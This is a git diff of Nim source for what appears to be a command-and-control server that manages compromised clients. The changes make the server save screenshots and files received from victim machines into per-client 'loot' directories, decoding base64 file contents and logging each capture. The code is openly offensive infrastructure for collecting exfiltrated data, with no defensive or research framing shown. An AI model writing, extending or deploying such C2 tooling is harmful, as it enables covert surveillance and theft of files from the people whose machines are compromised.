@@ -1,8 +1,8 @@
-import asyncdispatch, asyncfutures, strutils, strformat, json, base64, md5, tables, times
+import asyncdispatch, asyncfutures, strutils, strformat, json, base64, md5, tables, times, os
 
 import pixie, ws
 
-import types, logging, communication
+import types, logging, communication, loot
 
 proc generateClientHash(c: C2Client): string =
   getMD5(
@@ -102,16 +102,19 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
           #   "file": encode(image.encodeImage(JpegFormat)),
           #   "format": "jpeg"
           # }
-          let filePath = "loot/" & $client.id & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
+          let filePath = client[].getLootDirectory() & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
           image.writeFile(filePath)
           infoLog "saving screenshot from " & $client[] & " to " & filePath
       of "file":
         task.output = %*{
           "file": response["data"]["path"].getStr(),
-          "data": decode(response["data"]["contents"].getStr())
+          "data": decode response["data"]["contents"].getStr() 
         }
-        infoLog "received file " & response["data"]["path"].getStr() & " from " & $client[]
-        logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
+        let (_, name, ext) = splitFile response["data"]["path"].getStr()
+        let filePath = client[].getLootDirectory() & "/files/" & name & ext 
+        writeFile(filePath, decode response["data"]["contents"].getStr())
+        infoLog "received file " & name & ext & " from " & $client[]
+        # logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
     task.markAsCompleted(response)
     for wsConnection in client.server.wsConnections:
       if wsConnection.readyState == Open:
